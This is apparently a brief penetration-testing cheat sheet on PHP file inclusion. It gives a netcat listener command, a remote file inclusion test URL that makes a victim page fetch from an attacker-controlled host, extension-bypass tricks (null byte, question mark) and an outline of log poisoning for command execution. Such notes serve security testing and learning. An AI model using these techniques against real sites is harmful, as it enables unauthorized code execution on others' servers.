# File Inclusion

## Test for RFI

Setting up listener:

```
$ sudo nc -nlvp 80
```

Testing for RFI:

```
http://victim/page.php?file=http://attacker/test.txt
```

Check if Netcat listener caught a request.

## Bypass File Extensions

* Null byte (%00), for older PHP versions
* Question mark (?), for RFI

## LFI: Contaminating Log File To Get Command Exec

* Inject payload (command execution) in log file
* Exploit LFI by calling the log file
